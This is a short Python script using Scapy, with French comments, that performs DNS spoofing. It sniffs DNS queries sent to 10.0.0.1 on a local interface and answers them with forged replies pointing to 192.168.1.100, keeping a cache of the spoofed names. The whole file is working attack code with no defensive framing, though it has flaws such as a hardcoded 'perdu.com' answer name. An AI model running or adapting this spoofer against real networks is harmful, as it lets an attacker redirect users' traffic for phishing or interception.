from scapy.all import *

# Dictionnaire pour stocker le cache des réponses DNS
dns_cache = {}

def dns_menteur(packet):
    if DNSQR in packet and DNSRR not in packet and IP in packet and packet[IP].version == 4:
        # nom de domaine de la requête DNS
        query_name = packet[DNSQR].qname.decode("utf-8")

        # IP = 10.0.0.1 ? 
        if packet[IP].dst == "10.0.0.1":
            if query_name in dns_cache:
                # Nom de domaine est dans le cache, renvoyer l'IP associée
                spoofed_ip = dns_cache[query_name]
                print(f"Cache hit! Spoofing {query_name} to {spoofed_ip}")
            else:
                # Pas dans le cache -> IP spoofed
                spoofed_ip = "192.168.1.100"
                dns_cache[query_name] = spoofed_ip
                print(f"No cache! Spoofing {query_name} to {spoofed_ip}")

            # Réponse DNS
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / UDP(dport=packet[UDP].sport, sport=packet[UDP].sport) / DNS(
                id=packet[DNS].id,
                qr=1,
                aa=1,
                an=DNSRR(rrname="perdu.com",rdata=spoofed_ip),
                qd=DNSQR(qname=packet[DNSQR].qname.decode("utf-8"))
            )

            send(dns_response, verbose=False)

# Sniff des requêtes DNS IPv4
sniff(filter="udp and port 53", prn=dns_menteur, store=0, lfilter=lambda pkt: IP in pkt and pkt[IP].version == 4, iface="eno1")
